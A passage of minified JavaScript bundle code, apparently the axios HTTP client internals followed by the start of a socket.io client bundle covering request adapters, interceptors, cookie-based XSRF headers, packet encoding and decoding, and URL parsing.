                        t.push(e.fulfilled, e.rejected)
                    })); t.length;) s = s.then(t.shift(), t.shift());
                return s
            }, a.prototype.getUri = function(e) {
                return e = l(this.defaults, e), r(e.url, e.params, e.paramsSerializer).replace(/^\?/, "")
            }, n.forEach(["delete", "get", "head", "options"], (function(e) {
                a.prototype[e] = function(t, s) {
                    return this.request(l(s || {}, {
                        method: e,
                        url: t
                    }))
                }
            })), n.forEach(["post", "put", "patch"], (function(e) {
                a.prototype[e] = function(t, s, a) {
                    return this.request(l(a || {}, {
                        method: e,
                        url: t,
                        data: s
                    }))
                }
            })), e.exports = a
        }, function(e, t, s) {
            "use strict";

            function a(e) {
                return encodeURIComponent(e).replace(/%3A/gi, ":").replace(/%24/g, "$").replace(/%2C/gi, ",").replace(/%20/g, "+").replace(/%5B/gi, "[").replace(/%5D/gi, "]")
            }
            var n = s(2);
            e.exports = function(e, t, s) {
                if (!t) return e;
                var r;
                if (s) r = s(t);
                else if (n.isURLSearchParams(t)) r = t.toString();
                else {
                    var o = [];
                    n.forEach(t, (function(e, t) {
                        null != e && (n.isArray(e) ? t += "[]" : e = [e], n.forEach(e, (function(e) {
                            n.isDate(e) ? e = e.toISOString() : n.isObject(e) && (e = JSON.stringify(e)), o.push(a(t) + "=" + a(e))
                        })))
                    })), r = o.join("&")
                }
                if (r) {
                    var i = e.indexOf("#"); - 1 !== i && (e = e.slice(0, i)), e += (-1 === e.indexOf("?") ? "?" : "&") + r
                }
                return e
            }
        }, function(e, t, s) {
            "use strict";

            function a() {
                this.handlers = []
            }
            var n = s(2);
            a.prototype.use = function(e, t) {
                return this.handlers.push({
                    fulfilled: e,
                    rejected: t
                }), this.handlers.length - 1
            }, a.prototype.eject = function(e) {
                this.handlers[e] && (this.handlers[e] = null)
            }, a.prototype.forEach = function(e) {
                n.forEach(this.handlers, (function(t) {
                    null !== t && e(t)
                }))
            }, e.exports = a
        }, function(e, t, s) {
            "use strict";

            function a(e) {
                e.cancelToken && e.cancelToken.throwIfRequested()
            }
            var n = s(2),
                r = s(8),
                o = s(9),
                i = s(10);
            e.exports = function(e) {
                return a(e), e.headers = e.headers || {}, e.data = r(e.data, e.headers, e.transformRequest), e.headers = n.merge(e.headers.common || {}, e.headers[e.method] || {}, e.headers), n.forEach(["delete", "get", "head", "post", "put", "patch", "common"], (function(t) {
                    delete e.headers[t]
                })), (e.adapter || i.adapter)(e).then((function(t) {
                    return a(e), t.data = r(t.data, t.headers, e.transformResponse), t
                }), (function(t) {
                    return o(t) || (a(e), t && t.response && (t.response.data = r(t.response.data, t.response.headers, e.transformResponse))), Promise.reject(t)
                }))
            }
        }, function(e, t, s) {
            "use strict";
            var a = s(2);
            e.exports = function(e, t, s) {
                return a.forEach(s, (function(s) {
                    e = s(e, t)
                })), e
            }
        }, function(e, t) {
            "use strict";
            e.exports = function(e) {
                return !(!e || !e.__CANCEL__)
            }
        }, function(e, t, s) {
            "use strict";

            function a(e, t) {
                !n.isUndefined(e) && n.isUndefined(e["Content-Type"]) && (e["Content-Type"] = t)
            }
            var n = s(2),
                r = s(11),
                o = {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                i = {
                    adapter: function() {
                        var e;
                        return ("undefined" != typeof XMLHttpRequest || "undefined" != typeof process && "[object process]" === Object.prototype.toString.call(process)) && (e = s(12)), e
                    }(),
                    transformRequest: [function(e, t) {
                        return r(t, "Accept"), r(t, "Content-Type"), n.isFormData(e) || n.isArrayBuffer(e) || n.isBuffer(e) || n.isStream(e) || n.isFile(e) || n.isBlob(e) ? e : n.isArrayBufferView(e) ? e.buffer : n.isURLSearchParams(e) ? (a(t, "application/x-www-form-urlencoded;charset=utf-8"), e.toString()) : n.isObject(e) ? (a(t, "application/json;charset=utf-8"), JSON.stringify(e)) : e
                    }],
                    transformResponse: [function(e) {
                        if ("string" == typeof e) try {
                            e = JSON.parse(e)
                        } catch (e) {}
                        return e
                    }],
                    timeout: 0,
                    xsrfCookieName: "XSRF-TOKEN",
                    xsrfHeaderName: "X-XSRF-TOKEN",
                    maxContentLength: -1,
                    maxBodyLength: -1,
                    validateStatus: function(e) {
                        return e >= 200 && e < 300
                    },
                    headers: {
                        common: {
                            Accept: "application/json, text/plain, */*"
                        }
                    }
                };
            n.forEach(["delete", "get", "head"], (function(e) {
                i.headers[e] = {}
            })), n.forEach(["post", "put", "patch"], (function(e) {
                i.headers[e] = n.merge(o)
            })), e.exports = i
        }, function(e, t, s) {
            "use strict";
            var a = s(2);
            e.exports = function(e, t) {
                a.forEach(e, (function(s, a) {
                    a !== t && a.toUpperCase() === t.toUpperCase() && (e[t] = s, delete e[a])
                }))
            }
        }, function(e, t, s) {
            "use strict";
            var a = s(2),
                n = s(13),
                r = s(16),
                o = s(5),
                i = s(17),
                l = s(20),
                c = s(21),
                d = s(14);
            e.exports = function(e) {
                return new Promise((function(t, s) {
                    var u = e.data,
                        p = e.headers;
                    a.isFormData(u) && delete p["Content-Type"], (a.isBlob(u) || a.isFile(u)) && u.type && delete p["Content-Type"];
                    var m = new XMLHttpRequest;
                    if (e.auth) {
                        var f = e.auth.username || "",
                            h = unescape(encodeURIComponent(e.auth.password)) || "";
                        p.Authorization = "Basic " + btoa(f + ":" + h)
                    }
                    var g = i(e.baseURL, e.url);
                    if (m.open(e.method.toUpperCase(), o(g, e.params, e.paramsSerializer), !0), m.timeout = e.timeout, m.onreadystatechange = function() {
                            if (m && 4 === m.readyState && (0 !== m.status || m.responseURL && 0 === m.responseURL.indexOf("file:"))) {
                                var a = "getAllResponseHeaders" in m ? l(m.getAllResponseHeaders()) : null,
                                    r = {
                                        data: e.responseType && "text" !== e.responseType ? m.response : m.responseText,
                                        status: m.status,
                                        statusText: m.statusText,
                                        headers: a,
                                        config: e,
                                        request: m
                                    };
                                n(t, s, r), m = null
                            }
                        }, m.onabort = function() {
                            m && (s(d("Request aborted", e, "ECONNABORTED", m)), m = null)
                        }, m.onerror = function() {
                            s(d("Network Error", e, null, m)), m = null
                        }, m.ontimeout = function() {
                            var t = "timeout of " + e.timeout + "ms exceeded";
                            e.timeoutErrorMessage && (t = e.timeoutErrorMessage), s(d(t, e, "ECONNABORTED", m)), m = null
                        }, a.isStandardBrowserEnv()) {
                        var y = (e.withCredentials || c(g)) && e.xsrfCookieName ? r.read(e.xsrfCookieName) : void 0;
                        y && (p[e.xsrfHeaderName] = y)
                    }
                    if ("setRequestHeader" in m && a.forEach(p, (function(e, t) {
                            void 0 === u && "content-type" === t.toLowerCase() ? delete p[t] : m.setRequestHeader(t, e)
                        })), a.isUndefined(e.withCredentials) || (m.withCredentials = !!e.withCredentials), e.responseType) try {
                        m.responseType = e.responseType
                    } catch (t) {
                        if ("json" !== e.responseType) throw t
                    }
                    "function" == typeof e.onDownloadProgress && m.addEventListener("progress", e.onDownloadProgress), "function" == typeof e.onUploadProgress && m.upload && m.upload.addEventListener("progress", e.onUploadProgress), e.cancelToken && e.cancelToken.promise.then((function(e) {
                        m && (m.abort(), s(e), m = null)
                    })), u || (u = null), m.send(u)
                }))
            }
        }, function(e, t, s) {
            "use strict";
            var a = s(14);
            e.exports = function(e, t, s) {
                var n = s.config.validateStatus;
                s.status && n && !n(s.status) ? t(a("Request failed with status code " + s.status, s.config, null, s.request, s)) : e(s)
            }
        }, function(e, t, s) {
            "use strict";
            var a = s(15);
            e.exports = function(e, t, s, n, r) {
                var o = new Error(e);
                return a(o, t, s, n, r)
            }
        }, function(e, t) {
            "use strict";
            e.exports = function(e, t, s, a, n) {
                return e.config = t, s && (e.code = s), e.request = a, e.response = n, e.isAxiosError = !0, e.toJSON = function() {
                    return {
                        message: this.message,
                        name: this.name,
                        description: this.description,
                        number: this.number,
                        fileName: this.fileName,
                        lineNumber: this.lineNumber,
                        columnNumber: this.columnNumber,
                        stack: this.stack,
                        config: this.config,
                        code: this.code
                    }
                }, e
            }
        }, function(e, t, s) {
            "use strict";
            var a = s(2);
            e.exports = a.isStandardBrowserEnv() ? {
                write: function(e, t, s, n, r, o) {
                    var i = [];
                    i.push(e + "=" + encodeURIComponent(t)), a.isNumber(s) && i.push("expires=" + new Date(s).toGMTString()), a.isString(n) && i.push("path=" + n), a.isString(r) && i.push("domain=" + r), !0 === o && i.push("secure"), document.cookie = i.join("; ")
                },
                read: function(e) {
                    var t = document.cookie.match(new RegExp("(^|;\\s*)(" + e + ")=([^;]*)"));
                    return t ? decodeURIComponent(t[3]) : null
                },
                remove: function(e) {
                    this.write(e, "", Date.now() - 864e5)
                }
            } : {
                write: function() {},
                read: function() {
                    return null
                },
                remove: function() {}
            }
        }, function(e, t, s) {
            "use strict";
            var a = s(18),
                n = s(19);
            e.exports = function(e, t) {
                return e && !a(t) ? n(e, t) : t
            }
        }, function(e, t) {
            "use strict";
            e.exports = function(e) {
                return /^([a-z][a-z\d\+\-\.]*:)?\/\//i.test(e)
            }
        }, function(e, t) {
            "use strict";
            e.exports = function(e, t) {
                return t ? e.replace(/\/+$/, "") + "/" + t.replace(/^\/+/, "") : e
            }
        }, function(e, t, s) {
            "use strict";
            var a = s(2),
                n = ["age", "authorization", "content-length", "content-type", "etag", "expires", "from", "host", "if-modified-since", "if-unmodified-since", "last-modified", "location", "max-forwards", "proxy-authorization", "referer", "retry-after", "user-agent"];
            e.exports = function(e) {
                var t, s, r, o = {};
                return e ? (a.forEach(e.split("\n"), (function(e) {
                    if (r = e.indexOf(":"), t = a.trim(e.substr(0, r)).toLowerCase(), s = a.trim(e.substr(r + 1)), t) {
                        if (o[t] && n.indexOf(t) >= 0) return;
                        o[t] = "set-cookie" === t ? (o[t] ? o[t] : []).concat([s]) : o[t] ? o[t] + ", " + s : s
                    }
                })), o) : o
            }
        }, function(e, t, s) {
            "use strict";
            var a = s(2);
            e.exports = a.isStandardBrowserEnv() ? function() {
                function e(e) {
                    var t = e;
                    return s && (n.setAttribute("href", t), t = n.href), n.setAttribute("href", t), {
                        href: n.href,
                        protocol: n.protocol ? n.protocol.replace(/:$/, "") : "",
                        host: n.host,
                        search: n.search ? n.search.replace(/^\?/, "") : "",
                        hash: n.hash ? n.hash.replace(/^#/, "") : "",
                        hostname: n.hostname,
                        port: n.port,
                        pathname: "/" === n.pathname.charAt(0) ? n.pathname : "/" + n.pathname
                    }
                }
                var t, s = /(msie|trident)/i.test(navigator.userAgent),
                    n = document.createElement("a");
                return t = e(window.location.href),
                    function(s) {
                        var n = a.isString(s) ? e(s) : s;
                        return n.protocol === t.protocol && n.host === t.host
                    }
            }() : function() {
                return !0
            }
        }, function(e, t, s) {
            "use strict";
            var a = s(2);
            e.exports = function(e, t) {
                function s(e, t) {
                    return a.isPlainObject(e) && a.isPlainObject(t) ? a.merge(e, t) : a.isPlainObject(t) ? a.merge({}, t) : a.isArray(t) ? t.slice() : t
                }

                function n(n) {
                    a.isUndefined(t[n]) ? a.isUndefined(e[n]) || (r[n] = s(void 0, e[n])) : r[n] = s(e[n], t[n])
                }
                t = t || {};
                var r = {},
                    o = ["url", "method", "data"],
                    i = ["headers", "auth", "proxy", "params"],
                    l = ["baseURL", "transformRequest", "transformResponse", "paramsSerializer", "timeout", "timeoutMessage", "withCredentials", "adapter", "responseType", "xsrfCookieName", "xsrfHeaderName", "onUploadProgress", "onDownloadProgress", "decompress", "maxContentLength", "maxBodyLength", "maxRedirects", "transport", "httpAgent", "httpsAgent", "cancelToken", "socketPath", "responseEncoding"],
                    c = ["validateStatus"];
                a.forEach(o, (function(e) {
                    a.isUndefined(t[e]) || (r[e] = s(void 0, t[e]))
                })), a.forEach(i, n), a.forEach(l, (function(n) {
                    a.isUndefined(t[n]) ? a.isUndefined(e[n]) || (r[n] = s(void 0, e[n])) : r[n] = s(void 0, t[n])
                })), a.forEach(c, (function(a) {
                    a in t ? r[a] = s(e[a], t[a]) : a in e && (r[a] = s(void 0, e[a]))
                }));
                var d = o.concat(i).concat(l).concat(c),
                    u = Object.keys(e).concat(Object.keys(t)).filter((function(e) {
                        return -1 === d.indexOf(e)
                    }));
                return a.forEach(u, n), r
            }
        }, function(e, t) {
            "use strict";

            function s(e) {
                this.message = e
            }
            s.prototype.toString = function() {
                return "Cancel" + (this.message ? ": " + this.message : "")
            }, s.prototype.__CANCEL__ = !0, e.exports = s
        }, function(e, t, s) {
            "use strict";

            function a(e) {
                if ("function" != typeof e) throw new TypeError("executor must be a function.");
                var t;
                this.promise = new Promise((function(e) {
                    t = e
                }));
                var s = this;
                e((function(e) {
                    s.reason || (s.reason = new n(e), t(s.reason))
                }))
            }
            var n = s(23);
            a.prototype.throwIfRequested = function() {
                if (this.reason) throw this.reason
            }, a.source = function() {
                var e;
                return {
                    token: new a((function(t) {
                        e = t
                    })),
                    cancel: e
                }
            }, e.exports = a
        }, function(e, t) {
            "use strict";
            e.exports = function(e) {
                return function(t) {
                    return e.apply(null, t)
                }
            }
        }])
    })),
    function(e, t) {
        "object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? exports.io = t() : e.io = t()
    }(self, (function() {
        return function(e) {
            var t = {};

            function s(a) {
                if (t[a]) return t[a].exports;
                var n = t[a] = {
                    i: a,
                    l: !1,
                    exports: {}
                };
                return e[a].call(n.exports, n, n.exports, s), n.l = !0, n.exports
            }
            return s.m = e, s.c = t, s.d = function(e, t, a) {
                s.o(e, t) || Object.defineProperty(e, t, {
                    enumerable: !0,
                    get: a
                })
            }, s.r = function(e) {
                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
                    value: "Module"
                }), Object.defineProperty(e, "__esModule", {
                    value: !0
                })
            }, s.t = function(e, t) {
                if (1 & t && (e = s(e)), 8 & t) return e;
                if (4 & t && "object" == typeof e && e && e.__esModule) return e;
                var a = Object.create(null);
                if (s.r(a), Object.defineProperty(a, "default", {
                        enumerable: !0,
                        value: e
                    }), 2 & t && "string" != typeof e)
                    for (var n in e) s.d(a, n, function(t) {
                        return e[t]
                    }.bind(null, n));
                return a
            }, s.n = function(e) {
                var t = e && e.__esModule ? function() {
                    return e.default
                } : function() {
                    return e
                };
                return s.d(t, "a", t), t
            }, s.o = function(e, t) {
                return Object.prototype.hasOwnProperty.call(e, t)
            }, s.p = "", s(s.s = 18)
        }([function(e, t, s) {
            var a = s(24),
                n = s(25),
                r = String.fromCharCode(30);
            e.exports = {
                protocol: 4,
                encodePacket: a,
                encodePayload: function(e, t) {
                    var s = e.length,
                        n = new Array(s),
                        o = 0;
                    e.forEach((function(e, i) {
                        a(e, !1, (function(e) {
                            n[i] = e, ++o === s && t(n.join(r))
                        }))
                    }))
                },
                decodePacket: n,
                decodePayload: function(e, t) {
                    for (var s = e.split(r), a = [], o = 0; o < s.length; o++) {
                        var i = n(s[o], t);
                        if (a.push(i), "error" === i.type) break
                    }
                    return a
                }
            }
        }, function(e, t, s) {
            function a(e) {
                if (e) return function(e) {
                    for (var t in a.prototype) e[t] = a.prototype[t];
                    return e
                }(e)
            }
            e.exports = a, a.prototype.on = a.prototype.addEventListener = function(e, t) {
                return this._callbacks = this._callbacks || {}, (this._callbacks["$" + e] = this._callbacks["$" + e] || []).push(t), this
            }, a.prototype.once = function(e, t) {
                function s() {
                    this.off(e, s), t.apply(this, arguments)
                }
                return s.fn = t, this.on(e, s), this
            }, a.prototype.off = a.prototype.removeListener = a.prototype.removeAllListeners = a.prototype.removeEventListener = function(e, t) {
                if (this._callbacks = this._callbacks || {}, 0 == arguments.length) return this._callbacks = {}, this;
                var s, a = this._callbacks["$" + e];
                if (!a) return this;
                if (1 == arguments.length) return delete this._callbacks["$" + e], this;
                for (var n = 0; n < a.length; n++)
                    if ((s = a[n]) === t || s.fn === t) {
                        a.splice(n, 1);
                        break
                    } return 0 === a.length && delete this._callbacks["$" + e], this
            }, a.prototype.emit = function(e) {
                this._callbacks = this._callbacks || {};
                for (var t = new Array(arguments.length - 1), s = this._callbacks["$" + e], a = 1; a < arguments.length; a++) t[a - 1] = arguments[a];
                if (s) {
                    a = 0;
                    for (var n = (s = s.slice(0)).length; a < n; ++a) s[a].apply(this, t)
                }
                return this
            }, a.prototype.listeners = function(e) {
                return this._callbacks = this._callbacks || {}, this._callbacks["$" + e] || []
            }, a.prototype.hasListeners = function(e) {
                return !!this.listeners(e).length
            }
        }, function(e, t) {
            e.exports = "undefined" != typeof self ? self : "undefined" != typeof window ? window : Function("return this")()
        }, function(e, t, s) {
            function a(e) {
                return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }

            function n(e, t) {
                for (var s = 0; s < t.length; s++) {
                    var a = t[s];
                    a.enumerable = a.enumerable || !1, a.configurable = !0, "value" in a && (a.writable = !0), Object.defineProperty(e, a.key, a)
                }
            }

            function r(e, t) {
                return (r = Object.setPrototypeOf || function(e, t) {
                    return e.__proto__ = t, e
                })(e, t)
            }

            function o(e) {
                var t = function() {
                    if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
                    if (Reflect.construct.sham) return !1;
                    if ("function" == typeof Proxy) return !0;
                    try {
                        return Date.prototype.toString.call(Reflect.construct(Date, [], (function() {}))), !0
                    } catch (e) {
                        return !1
                    }
                }();
                return function() {
                    var s, a = l(e);
                    if (t) {
                        var n = l(this).constructor;
                        s = Reflect.construct(a, arguments, n)
                    } else s = a.apply(this, arguments);
                    return i(this, s)
                }
            }

            function i(e, t) {
                return !t || "object" !== a(t) && "function" != typeof t ? function(e) {
                    if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return e
                }(e) : t
            }

            function l(e) {
                return (l = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                    return e.__proto__ || Object.getPrototypeOf(e)
                })(e)
            }
            var c = s(0),
                d = function(e) {
                    ! function(e, t) {
                        if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                        e.prototype = Object.create(t && t.prototype, {
                            constructor: {
                                value: e,
                                writable: !0,
                                configurable: !0
                            }
                        }), t && r(e, t)
                    }(i, e);
                    var t, s, a = o(i);

                    function i(e) {
                        var t;
                        return function(e, t) {
                            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
                        }(this, i), (t = a.call(this)).opts = e, t.query = e.query, t.readyState = "", t.socket = e.socket, t
                    }
                    return t = i, (s = [{
                        key: "onError",
                        value: function(e, t) {
                            var s = new Error(e);
                            return s.type = "TransportError", s.description = t, this.emit("error", s), this
                        }
                    }, {
                        key: "open",
                        value: function() {
                            return "closed" !== this.readyState && "" !== this.readyState || (this.readyState = "opening", this.doOpen()), this
                        }
                    }, {
                        key: "close",
                        value: function() {
                            return "opening" !== this.readyState && "open" !== this.readyState || (this.doClose(), this.onClose()), this
                        }
                    }, {
                        key: "send",
                        value: function(e) {
                            "open" === this.readyState && this.write(e)
                        }
                    }, {
                        key: "onOpen",
                        value: function() {
                            this.readyState = "open", this.writable = !0, this.emit("open")
                        }
                    }, {
                        key: "onData",
                        value: function(e) {
                            var t = c.decodePacket(e, this.socket.binaryType);
                            this.onPacket(t)
                        }
                    }, {
                        key: "onPacket",
                        value: function(e) {
                            this.emit("packet", e)
                        }
                    }, {
                        key: "onClose",
                        value: function() {
                            this.readyState = "closed", this.emit("close")
                        }
                    }]) && n(t.prototype, s), i
                }(s(1));
            e.exports = d
        }, function(e, t) {
            t.encode = function(e) {
                var t = "";
                for (var s in e) e.hasOwnProperty(s) && (t.length && (t += "&"), t += encodeURIComponent(s) + "=" + encodeURIComponent(e[s]));
                return t
            }, t.decode = function(e) {
                for (var t = {}, s = e.split("&"), a = 0, n = s.length; a < n; a++) {
                    var r = s[a].split("=");
                    t[decodeURIComponent(r[0])] = decodeURIComponent(r[1])
                }
                return t
            }
        }, function(e, t, s) {
            "use strict";

            function a(e) {
                return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }

            function n(e, t, s) {
                return (n = "undefined" != typeof Reflect && Reflect.get ? Reflect.get : function(e, t, s) {
                    var a = function(e, t) {
                        for (; !Object.prototype.hasOwnProperty.call(e, t) && null !== (e = i(e)););
                        return e
                    }(e, t);
                    if (a) {
                        var n = Object.getOwnPropertyDescriptor(a, t);
                        return n.get ? n.get.call(s) : n.value
                    }
                })(e, t, s || e)
            }

            function r(e, t) {
                return (r = Object.setPrototypeOf || function(e, t) {
                    return e.__proto__ = t, e
                })(e, t)
            }

            function o(e, t) {
                return !t || "object" !== a(t) && "function" != typeof t ? function(e) {
                    if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return e
                }(e) : t
            }

            function i(e) {
                return (i = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                    return e.__proto__ || Object.getPrototypeOf(e)
                })(e)
            }

            function l(e, t) {
                if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
            }

            function c(e, t) {
                for (var s = 0; s < t.length; s++) {
                    var a = t[s];
                    a.enumerable = a.enumerable || !1, a.configurable = !0, "value" in a && (a.writable = !0), Object.defineProperty(e, a.key, a)
                }
            }

            function d(e, t, s) {
                return t && c(e.prototype, t), s && c(e, s), e
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.Decoder = t.Encoder = t.PacketType = t.protocol = void 0;
            var u, p = s(1),
                m = s(30),
                f = s(15);
            t.protocol = 5,
                function(e) {
                    e[e.CONNECT = 0] = "CONNECT", e[e.DISCONNECT = 1] = "DISCONNECT", e[e.EVENT = 2] = "EVENT", e[e.ACK = 3] = "ACK", e[e.CONNECT_ERROR = 4] = "CONNECT_ERROR", e[e.BINARY_EVENT = 5] = "BINARY_EVENT", e[e.BINARY_ACK = 6] = "BINARY_ACK"
                }(u = t.PacketType || (t.PacketType = {}));
            var h = function() {
                function e() {
                    l(this, e)
                }
                return d(e, [{
                    key: "encode",
                    value: function(e) {
                        return e.type !== u.EVENT && e.type !== u.ACK || !f.hasBinary(e) ? [this.encodeAsString(e)] : (e.type = e.type === u.EVENT ? u.BINARY_EVENT : u.BINARY_ACK, this.encodeAsBinary(e))
                    }
                }, {
                    key: "encodeAsString",
                    value: function(e) {
                        var t = "" + e.type;
                        return e.type !== u.BINARY_EVENT && e.type !== u.BINARY_ACK || (t += e.attachments + "-"), e.nsp && "/" !== e.nsp && (t += e.nsp + ","), null != e.id && (t += e.id), null != e.data && (t += JSON.stringify(e.data)), t
                    }
                }, {
                    key: "encodeAsBinary",
                    value: function(e) {
                        var t = m.deconstructPacket(e),
                            s = this.encodeAsString(t.packet),
                            a = t.buffers;
                        return a.unshift(s), a
                    }
                }]), e
            }();
            t.Encoder = h;
            var g = function(e) {
                ! function(e, t) {
                    if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                    e.prototype = Object.create(t && t.prototype, {
                        constructor: {
                            value: e,
                            writable: !0,
                            configurable: !0
                        }
                    }), t && r(e, t)
                }(s, e);
                var t = function(e) {
                    var t = function() {
                        if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
                        if (Reflect.construct.sham) return !1;
                        if ("function" == typeof Proxy) return !0;
                        try {
                            return Date.prototype.toString.call(Reflect.construct(Date, [], (function() {}))), !0
                        } catch (e) {
                            return !1
                        }
                    }();
                    return function() {
                        var s, a = i(e);
                        if (t) {
                            var n = i(this).constructor;
                            s = Reflect.construct(a, arguments, n)
                        } else s = a.apply(this, arguments);
                        return o(this, s)
                    }
                }(s);

                function s() {
                    return l(this, s), t.call(this)
                }
                return d(s, [{
                    key: "add",
                    value: function(e) {
                        var t;
                        if ("string" == typeof e)(t = this.decodeString(e)).type === u.BINARY_EVENT || t.type === u.BINARY_ACK ? (this.reconstructor = new y(t), 0 === t.attachments && n(i(s.prototype), "emit", this).call(this, "decoded", t)) : n(i(s.prototype), "emit", this).call(this, "decoded", t);
                        else {
                            if (!f.isBinary(e) && !e.base64) throw new Error("Unknown type: " + e);
                            if (!this.reconstructor) throw new Error("got binary data when not reconstructing a packet");
                            (t = this.reconstructor.takeBinaryData(e)) && (this.reconstructor = null, n(i(s.prototype), "emit", this).call(this, "decoded", t))
                        }
                    }
                }, {
                    key: "decodeString",
                    value: function(e) {
                        var t = 0,
                            a = {
                                type: Number(e.charAt(0))
                            };
                        if (void 0 === u[a.type]) throw new Error("unknown packet type " + a.type);
                        if (a.type === u.BINARY_EVENT || a.type === u.BINARY_ACK) {
                            for (var n = t + 1;
                                "-" !== e.charAt(++t) && t != e.length;);
                            var r = e.substring(n, t);
                            if (r != Number(r) || "-" !== e.charAt(t)) throw new Error("Illegal attachments");
                            a.attachments = Number(r)
                        }
                        if ("/" === e.charAt(t + 1)) {
                            for (var o = t + 1; ++t && "," !== e.charAt(t) && t !== e.length;);
                            a.nsp = e.substring(o, t)
                        } else a.nsp = "/";
                        var i = e.charAt(t + 1);
                        if ("" !== i && Number(i) == i) {
                            for (var l = t + 1; ++t;) {
                                var c = e.charAt(t);
                                if (null == c || Number(c) != c) {
                                    --t;
                                    break
                                }
                                if (t === e.length) break
                            }
                            a.id = Number(e.substring(l, t + 1))
                        }
                        if (e.charAt(++t)) {
                            var d = function(e) {
                                try {
                                    return JSON.parse(e)
                                } catch (e) {
                                    return !1
                                }
                            }(e.substr(t));
                            if (!s.isPayloadValid(a.type, d)) throw new Error("invalid payload");
                            a.data = d
                        }
                        return a
                    }
                }, {
                    key: "destroy",
                    value: function() {
                        this.reconstructor && this.reconstructor.finishedReconstruction()
                    }
                }], [{
                    key: "isPayloadValid",
                    value: function(e, t) {
                        switch (e) {
                            case u.CONNECT:
                                return "object" === a(t);
                            case u.DISCONNECT:
                                return void 0 === t;
                            case u.CONNECT_ERROR:
                                return "string" == typeof t || "object" === a(t);
                            case u.EVENT:
                            case u.BINARY_EVENT:
                                return Array.isArray(t) && t.length > 0;
                            case u.ACK:
                            case u.BINARY_ACK:
                                return Array.isArray(t)
                        }
                    }
                }]), s
            }(p);
            t.Decoder = g;
            var y = function() {
                function e(t) {
                    l(this, e), this.packet = t, this.buffers = [], this.reconPack = t
                }
                return d(e, [{
                    key: "takeBinaryData",
                    value: function(e) {
                        if (this.buffers.push(e), this.buffers.length === this.reconPack.attachments) {
                            var t = m.reconstructPacket(this.reconPack, this.buffers);
                            return this.finishedReconstruction(), t
                        }
                        return null
                    }
                }, {
                    key: "finishedReconstruction",
                    value: function() {
                        this.reconPack = null, this.buffers = []
                    }
                }]), e
            }()
        }, function(e, t) {
            var s = /^(?:(?![^:@]+:[^:@\/]*@)(http|https|ws|wss):\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?((?:[a-f0-9]{0,4}:){2,7}[a-f0-9]{0,4}|[^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/,
                a = ["source", "protocol", "authority", "userInfo", "user", "password", "host", "port", "relative", "path", "directory", "file", "query", "anchor"];
            e.exports = function(e) {
                var t = e,
                    n = e.indexOf("["),
                    r = e.indexOf("]"); - 1 != n && -1 != r && (e = e.substring(0, n) + e.substring(n, r).replace(/:/g, ";") + e.substring(r, e.length));
                for (var o, i, l = s.exec(e || ""), c = {}, d = 14; d--;) c[a[d]] = l[d] || "";
                return -1 != n && -1 != r && (c.source = t, c.host = c.host.substring(1, c.host.length - 1).replace(/;/g, ":"), c.authority = c.authority.replace("[", "").replace("]", "").replace(/;/g, ":"), c.ipv6uri = !0), c.pathNames = function(e, t) {
                    var s = t.replace(/\/{2,9}/g, "/").split("/");
                    return "/" != t.substr(0, 1) && 0 !== t.length || s.splice(0, 1), "/" == t.substr(t.length - 1, 1) && s.splice(s.length - 1, 1), s
                }(0, c.path), c.queryKey = (o = c.query, i = {}, o.replace(/(?:^|&)([^&=]*)=?([^&]*)/g, (function(e, t, s) {
                    t && (i[t] = s)
                })), i), c
            }
        }, function(e, t, s) {
            "use strict";

            function a(e) {
                return (a = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                } : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                })(e)
            }

            function n(e, t) {
                for (var s = 0; s < t.length; s++) {
                    var a = t[s];
                    a.enumerable = a.enumerable || !1, a.configurable = !0, "value" in a && (a.writable = !0), Object.defineProperty(e, a.key, a)
                }
            }

            function r(e, t) {
                return (r = Object.setPrototypeOf || function(e, t) {
                    return e.__proto__ = t, e
                })(e, t)
            }

            function o(e) {
                var t = function() {
                    if ("undefined" == typeof Reflect || !Reflect.construct) return !1;
                    if (Reflect.construct.sham) return !1;
                    if ("function" == typeof Proxy) return !0;
                    try {
                        return Date.prototype.toString.call(Reflect.construct(Date, [], (function() {}))), !0
                    } catch (e) {
                        return !1
                    }
                }();
                return function() {
                    var s, a = l(e);
                    if (t) {
                        var n = l(this).constructor;
                        s = Reflect.construct(a, arguments, n)
                    } else s = a.apply(this, arguments);
                    return i(this, s)
                }
            }

            function i(e, t) {
                return !t || "object" !== a(t) && "function" != typeof t ? function(e) {
                    if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return e
                }(e) : t
            }

            function l(e) {
                return (l = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                    return e.__proto__ || Object.getPrototypeOf(e)
                })(e)
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.Manager = void 0;
            var c = s(20),
                d = s(14),
                u = s(5),
                p = s(16),
